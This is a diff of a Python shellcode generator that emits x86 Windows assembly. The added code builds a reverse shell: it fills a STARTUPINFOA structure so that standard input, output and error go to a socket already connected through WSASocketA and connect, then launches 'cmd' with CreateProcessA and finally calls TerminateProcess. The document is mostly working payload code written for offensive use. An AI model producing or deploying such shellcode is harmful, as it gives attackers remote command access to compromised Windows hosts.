@@ -99,7 +99,9 @@ class Shellcode():
             "functionName"                  : 0x020, # TODO: make dynamic variables based on 0x000 vs "BUFFER"
             "wsaData"                       : 0x000,
             "name"                          : 0x010,
-            "lpStartInfo"                   : 0x000,
+            "lpStartupInfo"                 : ctypes.sizeof(_STARTUPINFOA),
+            "lpCommandLine"                 : len("cmd "),
+            "lpProcessInformation"          : 0x000,
         }
 
         # TODO: make work with x64 as well 
@@ -377,6 +379,8 @@ call_WSASocketA:
 
     call eax
 
+    ;int3
+
     mov esi, eax ; save the socket file descriptor (sockfd)
 
 ; EAX => connect([in] SOCKET s,
@@ -398,15 +402,82 @@ call_connect:
 
     call eax
 
-test:
-    nop
+; [EBX] => typedef struct _STARTUPINFOA {{ }}
+setup_STARTUPINFOA:
+    lea ebx, [ebp + {self.storage_offsets['lpStartupInfo']}]
+    lea edi, [ebp + {self.storage_offsets['lpStartupInfo']}]
+    xor eax, eax
+    xor ecx, ecx
+    mov cl, {int(ctypes.sizeof(_STARTUPINFOA) / 0x04)}
+    rep stosd
 
-    
+    mov al, {ctypes.sizeof(_STARTUPINFOA)}        ; lpStartInfo.cb = sizeof(_STARTUPINFO)
+    mov [ebx], eax
+
+    mov eax, {STARTF_USESTDHANDLES}
+    mov [ebx + {_STARTUPINFOA.dwFlags.offset}], eax
+    mov [ebx + {_STARTUPINFOA.hStdInput.offset}], esi
+    mov [ebx + {_STARTUPINFOA.hStdOutput.offset}], esi
+    mov [ebx + {_STARTUPINFOA.hStdError.offset}], esi
+
+; EAX => CreateProcessA([in, optional]      LPCSTR                lpApplicationName,
+;                       [in, out, optional] LPSTR                 lpCommandLine,
+;                       [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
+;                       [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
+;                       [in]                BOOL                  bInheritHandles,
+;                       [in]                DWORD                 dwCreationFlags,
+;                       [in, optional]      LPVOID                lpEnvironment,
+;                       [in, optional]      LPCSTR                lpCurrentDirectory,
+;                       [in]                LPSTARTUPINFOA        lpStartupInfo,
+;                       [out]               LPPROCESS_INFORMATION lpProcessInformation);
+    ;int3
+call_CreateProccessA:
+    push ebx ; lpProcessInformation
+
+    push ebx
+
+    xor ecx, ecx
+    push ecx ; lpCurrentDirectory
+
+    push ecx ; lpEnvironment
+
+    inc ecx
+    push ecx ; dwCreationFlags
+
+    dec ecx
+    push ecx ; bInheritHandles
+
+    push ecx ; lpThreadAttributes
+
+    push ecx ; lpProcessAttributes
+
+    lea ecx, [ebp + {self.storage_offsets['lpCommandLine']}]
+    mov dword ptr [ecx], 0x646d63
+    push ecx ; lpCommandLine
+
+    xor ecx, ecx
+    push ecx ; lpApplicationName
+
+    mov eax, [ebp + {self.storage_offsets['CreateProcessA']}]
+    call eax
+
+; EAX => TerminateProcess([in] HANDLE hProcess,
+;                         [in] UINT   uExitCode);
+call_TerminateProcess:
+    xor ecx, ecx
+    push ecx
+
+    dec ecx
+    push ecx    
+
+    mov eax, [ebp + {self.storage_offsets['TerminateProcess']}]
+    call eax
+
+    ret
 """
 
         shellcode += self.get_kernel32()
         shellcode += self.lookup_function()
-
 
         print(shellcode)
 
